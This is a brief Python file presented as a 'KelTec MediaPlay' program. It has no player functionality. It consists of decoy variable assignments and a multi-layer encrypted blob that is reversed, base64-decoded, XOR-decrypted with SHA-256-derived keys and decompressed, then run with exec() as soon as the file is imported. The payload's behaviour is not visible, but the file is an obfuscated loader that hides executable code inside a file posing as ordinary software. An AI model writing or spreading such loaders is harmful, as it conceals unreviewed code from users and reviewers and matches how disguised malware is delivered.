# -*- coding: utf-8 -*-
# KelTec MediaPlay 

_lx0_0 = 547692 ^ 990769
_lx1_1 = len("1a6fb3")
import zlib as _z,base64 as _b,hashlib as _h,sys as _s,os as _o
_lx2_2 = abs(-986258)
_lx3_3 = 548163 * 0
_lx4_4 = 966789 ^ 723500
_K = '77bf96324cd62a04ccf072ab4dfd3aadce60c482dd428f2c89d112823bc85814'
_M = 'XIHV08DmNkkJUBfbDUEl5Lz+HYLjYTCKP8bGypC1T+we04KJmuc8GAAHHd0JEXLk7/ZP2b8zbtBpwcGaxOVJ6B2CgoqesGsYVlAe'
_D = '==QBKR8Fld1LnfX2J2zqQq46FLUW49bAhX0wrr9O9giFkXqZbZwg8oKlwJVg/FHoI//i97C08A+oOmioOC82JO0yP4ELWqjdPwF7iIRWL2WUvuB64iLFlf5HDPIdOUCV2JE0XhmG15/k2kUo28/5RXcMTI/2c0k2pIiBJLRpd9qtOcOQ1ptg+hUdrDyj+NZ0n91kTB4Vql5O0oZZ8lPYt0cC46s9IAea7nCwvIUZRRgSTPLoYnADbeEZJMWtE1Dye1c9OhezsGMcBqO1KzzFFzf61REz71+2WK+ZIvYDh4qSioZthAg2bunLFd5FbZQ9Czcgq146Oi160QovSZzUftbMaXNC8WuqkAhzqi0NQrOX0of2PuKyN89cvc9EFfWLi2ON4+27cR5KZCRDiHQaBE2ppLI3CsshXFnev7j+TG9IvWlyj8q91eh7wpPk77dFihxMlgE9Voz96cvOXto2tkuNmCqfC5MmQLUXx4gcngmhPdeXvth0S/1yM/yTyoxfCmtFyaXMVxUoRJDfaTNqTZFFkDTBhVsMF0gLODdf44V/29l1s1xbay/mZhLA853gVlCH3QrdhYAVsc3tJpFUgAB39u5qHAAjZtVsd4J4tFSEHeWwC/gWB3UKHhEQYRPW2ByjbRjYn7l2y+/kKN2DUAFhOfgLTdSs1Te2R3YORuoof/93ApnejFg4bkH1G28msTVjrayuMUEgohCKiP2mbQk1yS885aIxZ2NEiPQE+Oz2GAVHCdH2uSnyKeOTesHeph5l0iJzVHYOFgGpYAPxevA/ORggUKWgfeYL6rfZMWTzOp3aS7NXoT2sQ/Ing3cEtA/72nnOMyCena7WyJO5TdCuyuav/4wZg+W77J7P/gWNGco5nT7jbkDTlgQMguC+YIuq+X0OgaDq347rxQU/TwNC4FhS4eBeqQQ9h5k+JHvyLMMQ5ArBsl2nG+YD/YT7RRMX4iihb+812YJogXnDHCrokpQ/SchnQvU6CxK6MAZEOY4kh9S8M2aSlVbvS6fW/QFxwgy/bZYTstMyih/unPv3eTzw+9a4YUqkmPgbqG263UWziXIqnYwYxKv1+OecPOgr5gkUIpxw32DEmVKaHOdp+SFkTcTEtcmsCICFZ0gyKGAg9hK7rPd8OFVaKxjacz8hHIFGh13f9a87komJ8G3OpPWLSYPn/lzE/ReYdJ/ySuYgb2CYDnYOZhHB5QIUXFaCIjjkfbkXRrsikAcL+s2Ta5Q7r+JWyobvhjorZc6+vK6DtRakFiQo6b8Cwcky7MwOyKrsbFmqDbXycYLSXvD1exdZ9REcKhOCr2joT59+YnNmpKQQLXTfTkrGjIk7Rr+cFP40x6XYReNQu+sBWZtHS6P3tr1eiJUHzDoz+vnTi5lqUiTYJMmOMFKN62Edb92qQTWGzOSyU3OwN0HtKB7w1I6KRGCH9sYjiVaifGQ5rG0B2xJ3ZY8m44IcPdLz37wBEU6HuNd4MI3ry9kLYWrI+2IzTk3tCNrCGmrlU9IGxw2d82ST720UDjV05fpGtmrbUKOgubkH63oMqTQQhTUgBSZs8hgTo+yZ13Pw0jNRdeNb52rLyYVXVVJabFfAFecgIrWVa/PdZ3Xzb4pLGrJ6ZO4YuQR8GuJinuM1sSfUMGYqZWI9TMgANSgW'

def _xr(d,k):
    kl=len(k);return bytes(d[i]^k[i%kl] for i in range(len(d)))
def _dk(sd,c):
    return _h.sha256((_K+sd+str(c)).encode('utf-8')).digest()
def _dc(s,c,sd):
    r=_b.b64decode(s[::-1]);return _z.decompress(_xr(r,_dk(sd,c))).decode('utf-8')
def _run():
    mk=_h.sha256(_K.encode('utf-8')).digest()
    meta=_xr(_b.b64decode(_M),mk).decode('utf-8').split(':',2)
    sd=meta[0];nc=int(meta[1])
    d=_D
    for c in range(nc-1,-1,-1):d=_dc(d,c,sd)
    idx=d.find('||')
    src=d[idx+2:] if idx!=-1 else d
    _e={'__name__':'__main__','__file__':__file__}
    exec(compile(src,'<mediaplay>','exec'),_e)
    return _e
_e=_run()
globals().update({_k:_v for _k,_v in _e.items() if not _k.startswith('_')})